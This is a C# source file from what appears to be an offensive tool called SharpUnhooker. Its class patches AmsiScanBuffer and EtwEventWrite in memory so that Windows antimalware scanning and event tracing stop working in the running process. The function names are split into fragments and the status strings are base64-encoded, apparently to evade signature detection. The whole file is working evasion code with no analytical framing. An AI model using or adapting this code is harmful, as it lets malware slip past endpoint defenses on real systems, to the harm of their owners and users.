using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpUnhooker
{
    internal class PatchAMSIAndETW
    {

        // Thx D/Invoke!
        private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            // will return IntPtr.Zero if not found!
            return FunctionPtr;
        }

        private static void PatchETW()
        {
            try
            {
                IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
                IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
                byte[] patchbyte = new byte[0];
                if (IntPtr.Size == 4)
                {
                    string patchbytestring2 = "33,c0,c2,14,00";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                else
                {
                    string patchbytestring2 = "48,33,C0,C3";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                IntPtr funcPtr = GetExportAddress(libPtr, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                UInt32 oldProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                UInt32 newProtect = 0;
                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gRVRXIFNVQ0NFU1NGVUxMWSBQQVRDSEVEIQ==")));
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] {0}", e.Message);
                Console.WriteLine("[-] {0}", e.InnerException);
            }
        }

        private static void PatchAMSI()
        {
            try
            {
                IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
                byte[] patchbyte = new byte[0];
                if (IntPtr.Size == 4)
                {
                    string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                else
                {
                    string patchbytestring2 = "B8,57,00,07,80,C3";
                    string[] patchbytestring = patchbytestring2.Split(',');
                    patchbyte = new byte[patchbytestring.Length];
                    for (int i = 0; i < patchbytestring.Length; i++)
                    {
                        patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                    }
                }
                IntPtr libPtr;
                try { libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); } catch { libPtr = IntPtr.Zero; }
                if (libPtr != IntPtr.Zero)
                {
                    IntPtr funcPtr = GetExportAddress(libPtr, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
                    IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                    UInt32 oldProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                    Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
                    UInt32 newProtect = 0;
                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gQU1TSSBTVUNDRVNTRlVMTFkgUEFUQ0hFRCE=")));
                }
                else
                {
                    Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("Wy1dIEFNU0kuRExMIElTIE5PVCBERVRFQ1RFRCE=")));
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[-] {0}", e.Message);
                Console.WriteLine("[-] {0}", e.InnerException);
            }
        }

        public static void Run()
        {
            PatchAMSI();
            PatchETW();
        }
    }
}
